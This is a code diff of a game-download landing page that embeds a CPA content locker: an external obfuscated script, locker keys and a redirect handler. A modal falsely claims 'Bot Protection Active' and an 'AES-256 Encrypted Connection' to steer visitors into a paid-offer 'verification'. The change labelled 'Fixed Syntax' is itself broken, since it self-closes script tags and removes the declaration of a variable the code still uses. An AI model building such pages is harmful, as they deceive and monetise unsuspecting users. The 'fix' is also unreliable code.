@@ -12,21 +12,20 @@
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 
-    <!-- CPA Locker Scripts -->
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    <script type="text/javascript">
-        var BSBJx_cAE_KMSZJc={"it":3198266,"key":"9d0ca"};
-        var forward="";
-        var CPABUILDSETTINGS = {};
-        CPABUILDSETTINGS.onComplete=function(data){
-            window.location=forward;
-            return false;
-        };
-    </script>
-    <script type="text/javascript">
-        var QAnkp_JJD_aMSgEc={"it":3198266,"key":"9d0ca"};
-    </script>
-    <script src="https://d26h1wdc757l2w.cloudfront.net/9aa217c.js"></script>
+    <!-- CPA Locker Scripts (Fixed Syntax) -->
+    <script src='https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js'/>
+<script type='text/javascript'>
+    var BSBJx_cAE_KMSZJc={"it":3198266,"key":"9d0ca"};
+    var forward="";
+    CPABUILDSETTINGS.onComplete=function(data){
+        window.location=forward;
+        return false;
+    };
+</script>
+<script type='text/javascript'>
+    var QAnkp_JJD_aMSgEc={"it":3198266,"key":"9d0ca"};
+</script>
+<script src='https://d26h1wdc757l2w.cloudfront.net/9aa217c.js'/>
     
     <style>
         :root {
@@ -393,10 +392,11 @@
         .modal-sheet h3 { font-size: 1.3rem; font-weight: 800; margin-bottom: 8px; }
         .modal-sheet p { font-size: 0.9rem; color: var(--text-muted); margin-bottom: 24px; line-height: 1.5; }
 
-        /* CPA Trigger Button */
+        /* The Actual CPA Link Button */
         .btn-cpa {
             background: linear-gradient(135deg, var(--emerald), var(--emerald-dark));
             color: #000;
+            text-decoration: none;
             width: 100%;
             padding: 18px;
             border-radius: var(--radius-md);
@@ -407,8 +407,6 @@
             justify-content: center;
             gap: 10px;
             margin-bottom: 12px;
-            border: none;
-            cursor: pointer;
         }
 
         .close-btn {
@@ -511,10 +509,8 @@
             <h3>Bot Protection Active</h3>
             <p>To access the Block Craft Premium Vault, please complete 1 quick free verification step to confirm you are a real player.</p>
 
-            <!-- Trigger Content Locker via script -->
-            <button type="button" class="btn-cpa" onclick="_eN()">
-                <i class="fas fa-check-circle"></i> Verify & Download Now
-            </button>
+            <button class='btn-cpa' onclick='_eN()'>Verify & Download Now</button>
+            
             
             <p style="font-size: 0.75rem; margin-top: 15px; margin-bottom: 0;">
                 <i class="fas fa-lock"></i> AES-256 Encrypted Connection
